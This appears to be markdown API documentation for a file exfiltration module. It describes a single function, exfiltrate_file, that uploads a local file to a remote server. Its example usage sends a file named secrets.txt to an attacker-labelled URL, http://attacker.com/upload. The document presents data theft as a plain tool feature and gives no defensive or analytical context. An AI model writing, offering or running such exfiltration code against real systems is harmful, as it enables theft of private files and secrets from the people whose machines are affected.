
---

**File**: `File_Exfiltration_API.md`

```markdown
# File Exfiltration Module API Documentation

## Functions
### `exfiltrate_file(file_path, server_url)`
- **Description**: Exfiltrates a file to a remote server.
- **Parameters**:
  - `file_path`: The path to the file to exfiltrate.
  - `server_url`: The URL of the remote server.
- **Returns**: A string indicating success or failure.

## Example Usage
```python
from file_exfil import exfiltrate_file

# Exfiltrate a file to a remote server
result = exfiltrate_file("C:\\secrets.txt", "http://attacker.com/upload")
print(result)